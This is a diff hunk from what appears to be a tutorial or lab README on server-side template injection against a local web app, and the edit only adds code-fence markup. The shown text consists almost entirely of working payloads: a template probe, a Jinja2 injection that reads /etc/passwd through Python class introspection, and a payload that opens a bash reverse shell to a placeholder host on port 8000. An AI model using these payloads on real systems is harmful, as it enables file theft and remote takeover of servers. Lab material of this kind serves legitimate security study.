@@ -40,9 +40,9 @@ http://localhost:4444/?username={{4*4}} <br />
 OUTPUT: Hello 16
 
 Reading the /etc/passwd <br />
-
+```c
 http://localhost:4444/?username={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} <br />
-
+```
 
 Getting a reverse shell 
 http://localhost:4444/?username={{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }}
